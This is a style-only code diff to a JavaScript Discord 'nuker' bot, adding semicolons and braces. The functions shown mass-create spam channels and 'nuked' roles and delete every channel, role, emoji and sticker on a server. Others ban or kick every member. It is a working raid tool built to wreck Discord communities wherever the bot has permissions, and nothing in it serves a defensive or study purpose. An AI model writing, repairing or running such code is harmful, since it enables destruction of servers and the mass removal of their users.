@@ -151,7 +151,7 @@ nuker.on("messageCreate", (message) => {
         } else {
             // Help
             if (message.content.startsWith(prefix + "help")) {
-                message.channel.send({embeds: [help]})
+                message.channel.send({embeds: [help]});
             }
 
             // Mass Channels
@@ -241,11 +241,13 @@ nuker.on("messageCreate", (message) => {
                 return reject("Bot Missing Permissions: 'MANAGE_CHANNELS'");
             }
             for (let i = 0; i < amount; i++) {
-                if (message.guild.channels.cache.size === 500) break;
+                if (message.guild.channels.cache.size === 500) {
+                    break;
+                }
                 if (!channelName) {
-                    message.guild.channels.create(`${message.author.username} was here`, { type: "GUILD_TEXT" }).catch((err) => { Console.log(red("Error Found: " + err)) })
+                    message.guild.channels.create(`${message.author.username} was here`, { type: "GUILD_TEXT" }).catch((err) => { Console.log(red("Error Found: " + err)) });
                 } else {
-                    message.guild.channels.create(channelName, { type: "GUILD_TEXT" }).catch((err) => { Console.log(red("Error Found: " + err)) })
+                    message.guild.channels.create(channelName, { type: "GUILD_TEXT" }).catch((err) => { Console.log(red("Error Found: " + err)) });
                 }
             }
             resolve();
@@ -303,8 +305,10 @@ nuker.on("messageCreate", (message) => {
      */
     function DelAllChannels() {
         return new Promise((resolve, reject) => {
-            if (!channelPerms) return reject("Bot Missing Permissions: 'MANAGE_CHANNELS'");
-            message.guild.channels.cache.forEach((ch) => ch.delete().catch((err) => { Console.log(red("Error Found: " + err)) }))
+            if (!channelPerms) {
+                return reject("Bot Missing Permissions: 'MANAGE_CHANNELS'");
+            }
+            message.guild.channels.cache.forEach((ch) => ch.delete().catch((err) => { Console.log(red("Error Found: " + err)) }));
             resolve();
         });
     }
@@ -316,18 +320,26 @@ nuker.on("messageCreate", (message) => {
      */
     function MassRoles(amount, roleName) {
         return new Promise((resolve, reject) => {
-            if (!amount) return reject("Unspecified Args: Specify the amount you wish to mass roles");
-            if (isNaN(amount)) return reject("Type Error: Use a number for the amout");
-            if (!rolePerms) return reject("Bot Missing Permissions: 'MANAGE_ROLES'");
+            if (!amount) {
+                return reject("Unspecified Args: Specify the amount you wish to mass roles");
+            }
+            if (isNaN(amount)) {
+                return reject("Type Error: Use a number for the amout");
+            }
+            if (!rolePerms) {
+                return reject("Bot Missing Permissions: 'MANAGE_ROLES'");
+            }
             for (let i = 0; i <= amount; i++) {
-                if (message.guild.roles.cache.size === 250) break;
+                if (message.guild.roles.cache.size === 250) {
+                    break;
+                }
                 if (!roleName) {
-                    message.guild.roles.create({ name: "nuked", color: "RANDOM", position: i++ }).catch((err) => { Console.log(red("Error Found: " + err)) })
+                    message.guild.roles.create({ name: "nuked", color: "RANDOM", position: i++ }).catch((err) => { Console.log(red("Error Found: " + err)) });
                 } else {
-                    message.guild.roles.create({ name: roleName, color: "RANDOM", position: i++ }).catch((err) => { Console.log(red("Error Found: " + err)) })
+                    message.guild.roles.create({ name: roleName, color: "RANDOM", position: i++ }).catch((err) => { Console.log(red("Error Found: " + err)) });
                 }
             }
-        })
+        });
     }
 
     /**
@@ -336,7 +348,7 @@ nuker.on("messageCreate", (message) => {
     function DelAllRoles() {
         return new Promise((resolve, reject) => {
             if (!rolePerms) return reject("Bot Missing Permissions: 'MANAGE_ROLES'");
-            message.guild.roles.cache.forEach((r) => r.delete().catch((err) => { Console.log(red("Error Found: " + err)) }))
+            message.guild.roles.cache.forEach((r) => r.delete().catch((err) => { Console.log(red("Error Found: " + err)) }));
         });
     }
 
@@ -345,8 +357,10 @@ nuker.on("messageCreate", (message) => {
      */
     function DelAllEmotes() {
         return new Promise((resolve, reject) => {
-            if (!emotePerms) return reject("Bot Missing Permissions: 'MANAGE_EMOJIS_AND_STICKERS'");
-            message.guild.emojis.cache.forEach((e) => e.delete().catch((err) => { Console.log(red("Error Found: " + err)) }))
+            if (!emotePerms) {
+                return reject("Bot Missing Permissions: 'MANAGE_EMOJIS_AND_STICKERS'");
+            }
+            message.guild.emojis.cache.forEach((e) => e.delete().catch((err) => { Console.log(red("Error Found: " + err)) }));
         });
     }
 
@@ -355,8 +369,10 @@ nuker.on("messageCreate", (message) => {
      */
     function DelAllStickers() {
         return new Promise((resolve, reject) => {
-            if (!emotePerms) return reject("Bot Missing Permissions: 'MANAGE_EMOJIS_AND_STICKERS'");
-            message.guild.stickers.cache.forEach((s) => s.delete().catch((err) => { Console.log(red("Error Found: " + err)) }))
+            if (!emotePerms) {
+                return reject("Bot Missing Permissions: 'MANAGE_EMOJIS_AND_STICKERS'");
+            }
+            message.guild.stickers.cache.forEach((s) => s.delete().catch((err) => { Console.log(red("Error Found: " + err)) }));
         });
     }
 
@@ -365,7 +381,9 @@ nuker.on("messageCreate", (message) => {
      */
     function BanAll() {
         return new Promise((resolve, reject) => {
-            if (!banPerms) return reject("Bot Missing Permissions: 'BAN_MEMBERS'");
+            if (!banPerms) {
+                return reject("Bot Missing Permissions: 'BAN_MEMBERS'");
+            }
             let arrayOfIDs = message.guild.members.cache.map((user) => user.id);
             message.reply("Found " + arrayOfIDs.length + " users.").then((msg) => {
                 setTimeout(() => {
@@ -385,7 +403,9 @@ nuker.on("messageCreate", (message) => {
      */
     function KickAll() {
         return new Promise((resolve, reject) => {
-            if (!kickPerms) return reject("Bot Missing Permissions: 'KICK_MEMBERS'");
+            if (!kickPerms) {
+                return reject("Bot Missing Permissions: 'KICK_MEMBERS'");
+            }
             let arrayOfIDs = message.guild.members.cache.map((user) => user.id);
             message.reply("Found " + arrayOfIDs.length + " users.").then((msg) => {
                 setTimeout(() => {
